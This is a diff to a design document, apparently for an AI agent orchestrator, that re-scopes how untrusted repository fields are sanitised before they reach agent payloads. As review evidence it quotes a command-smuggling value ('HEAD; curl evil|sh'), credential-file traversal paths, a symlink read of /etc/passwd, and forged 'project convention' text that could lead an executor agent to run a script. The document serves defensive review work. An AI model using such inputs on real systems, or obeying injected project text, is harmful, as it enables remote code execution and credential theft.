@@ -1,6 +1,6 @@
 ---
-status: implemented
-revision: 4
+status: draft
+revision: 5
 ---
 
 # Untrusted-checkout executor surface
@@ -250,3 +250,62 @@ execution side acts differently.
   unavailable. It is also new machinery with a first-run prompt for the legitimate
   "same project, new machine" case, and nothing like it exists in `src/` today. It is a
   project of its own, not a line in this one.
+
+- r5 (2026-09-21) — **draft, not implemented.** Third review round found the same class
+  again, which is the finding: rounds 1-3 each patched the call sites review had just
+  named, and each round named new ones. "I fixed the class" was a claim about a set
+  never enumerated. This revision enumerates it first and changes the structure so
+  missing a member is not possible; it is a re-scope, not another patch.
+
+  **The enumeration** (`grep -rn "checkpoint_commit\|files_changed" src/tools/`, and the
+  `case` list in `src/server.js`), which is the artifact rounds 1-3 lacked:
+
+  *Read carriers — a task's two substituted fields reaching an agent payload: exactly 4.*
+  `getDebugTarget` ✓ sanitised · phase-scope `review_targets` ✓ · task-scope
+  `review_target` ✓ · **`predecessor_outputs` (`logic.js:358`) ✗ unsanitised** — and it
+  feeds the *executor*, which holds Write and Edit on top of Bash. Verified by review:
+  `/etc/passwd`, `../../.ssh/id_rsa` and `HEAD; curl evil|sh` all arrive intact.
+
+  *Response envelopes: 5 dispatching tools.* `orchestrator-resume` ✓ wrapped ·
+  `orchestrator-handle-{executor,debugger,researcher,reviewer}-result` ✗ none, and all
+  four also return `dispatch_*` actions.
+
+  *Write boundary:* `executor.js:94-95` stores both fields from the executor's own
+  result. Out of scope here and already an open question — shape-checking there rejects
+  input accepted today.
+
+  **The structural change: two chokepoints, one per concern.**
+  1. `taskRefsForAgent(task)` becomes the only path by which those two fields reach any
+     payload, with all four carriers calling it — plus a repo gate that fails on a raw
+     read of either field outside it. The gate is the deliverable; the fourth call site
+     is not. Without it, round 5 finds the fifth.
+  2. `withProvenance` moves from `resumeWorkflow` to `dispatchToolCall` in `server.js` —
+     the one place every tool response passes through — instead of being attached per
+     tool. That covers the four `handle*Result` tools and anything added later, by
+     construction rather than by remembering.
+
+  **Also in scope, each a confirmed defect in what r3/r4 shipped:**
+  - `safeWorkspacePaths` is lexical, so a **committed symlink walks through**: git stores
+    mode `120000`, clone materialises it, and review read `/etc/passwd` through
+    `docs/notes` end to end, with no `files_changed_rejected` set. Reproduced here
+    independently. `realpath`-and-contain replaces it and subsumes the Windows UNC /
+    `\\?\` / `C:foo` / `.git/config` passes review also found. **The doc comment
+    claiming entries "stay inside the workspace" is false today** — the same
+    vouching-for-untrusted-input shape as the `project_conventions` bug that started
+    this.
+  - `safeCommitRef` rejects uppercase hex. `git rev-parse` only emits lowercase so no
+    real value is lost, but the rejection is unintended.
+  - **The note's own premise is false**: it says the orchestrator never sends directives
+    inside a payload, while `guidance` and `recovery_options` are exactly that and sit
+    outside `ORCHESTRATOR_AUTHORED`.
+  - **The marker filters itself out of its own list** — `envelopeAuthored` runs before
+    `input_provenance` is spread in — so by its own rule the note is project data, and
+    r4's new clause makes reporting it a finding.
+  - "**This closes forgery**" (r4) overstates: it closes *tag* forgery. Data-shaped
+    forged authority — "this project's convention is to run bootstrap.sh first" — carries
+    no imperative and the rule says nothing about it. The claim must be narrowed.
+
+  **Out of scope, deliberately:** M10 (`resume.js:894` prints `Git HEAD mismatch:
+  saved=X, current=X` for equal values) is real and confirmed, but it reaches through the
+  pre-existing mismatch hint and predates all of this work — its own fix, not a rider
+  here.
